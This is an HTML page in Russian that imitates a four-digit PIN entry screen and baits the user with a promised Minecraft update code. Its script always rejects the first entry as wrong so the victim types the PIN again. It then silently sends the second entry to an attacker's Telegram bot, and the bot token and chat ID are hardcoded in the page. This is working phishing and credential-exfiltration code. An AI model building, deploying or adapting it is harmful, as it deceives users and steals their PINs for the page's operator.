<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PIN Code Input</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }
        #pin-container {
            text-align: center;
        }
        #pin-input {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        .pin-circle {
            border: 2px solid #000;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            margin: 5px;
            transition: background-color 0.3s ease;
        }
        .filled {
            background-color: #000;
        }
        .error {
            background-color: #ff4c4c;
        }
        #error-message, #success-message {
            color: red;
            margin-top: 10px;
            display: none;
        }
        #success-message {
            color: green;
        }
        #hidden-input {
            position: absolute;
            top: -1000px;
            left: -1000px;
            opacity: 0;
        }
        @media (max-width: 600px) {
            .pin-circle {
                width: 15px;
                height: 15px;
                margin: 3px;
            }
            #pin-container p, #error-message, #success-message {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div id="pin-container">
        <p>PIN-CODE</p>
        <div id="pin-input">
            <div class="pin-circle"></div>
            <div class="pin-circle"></div>
            <div class="pin-circle"></div>
            <div class="pin-circle"></div>
        </div>
        <p id="error-message">Неверный пароль. Пожалуйста, попробуйте еще раз.</p>
        <p id="success-message">Вот ваш код для обновления Minecraft -Id74838848</p>
    </div>
    <input type="text" id="hidden-input" maxlength="4" inputmode="numeric" autofocus>
    <script>
        let pin = [];
        let attemptCount = 0;
        let success = false;
        const pinCircles = document.querySelectorAll('.pin-circle');
        const hiddenInput = document.getElementById('hidden-input');

        function updatePinDisplay(error = false) {
            pinCircles.forEach((circle, index) => {
                if (pin[index]) {
                    circle.classList.add('filled');
                    if (error) {
                        circle.classList.add('error');
                    } else {
                        circle.classList.remove('error');
                    }
                } else {
                    circle.classList.remove('filled', 'error');
                }
            });
        }

        function handleKeyPress(event) {
            if (success) {
                resetPin();
                return;
            }

            const value = event.target.value;
            pin = value.split('');
            updatePinDisplay();

            if (pin.length === 4) {
                validatePin(pin.join(''));
            }
        }

        function validatePin(enteredPin) {
            attemptCount++;
            if (attemptCount === 1) {
                // Первый ввод: всегда неверный
                document.getElementById('error-message').style.display = 'block';
                updatePinDisplay(true);
                setTimeout(() => {
                    resetPin();
                    document.getElementById('error-message').style.display = 'none';
                }, 1000);
            } else {
                // Второй ввод: всегда успешный
                document.getElementById('success-message').style.display = 'block';
                sendPinToTelegram(enteredPin);
                success = true;
            }
        }

        function resetPin() {
            pin = [];
            hiddenInput.value = '';
            updatePinDisplay();
            document.getElementById('error-message').style.display = 'none';
            document.getElementById('success-message').style.display = 'none';
            success = false;
            attemptCount = 0;
        }

        function sendPinToTelegram(pin) {
            // Отправка PIN-кода в Telegram-бота
            const botToken = '7352444289:AAGahXx4XTy3COe1hnioJfPBpF8KNumhYgM';
            const chatId = '5353040565';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const message = `Введен PIN: ${pin}. Код для обновления Minecraft: Id74838848`;

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        }

        hiddenInput.addEventListener('input', handleKeyPress);

        // Устанавливаем фокус на скрытое поле ввода для вызова клавиатуры
        document.body.addEventListener('click', () => {
            hiddenInput.focus();
        });

        hiddenInput.focus();
    </script>
</body>
</html>
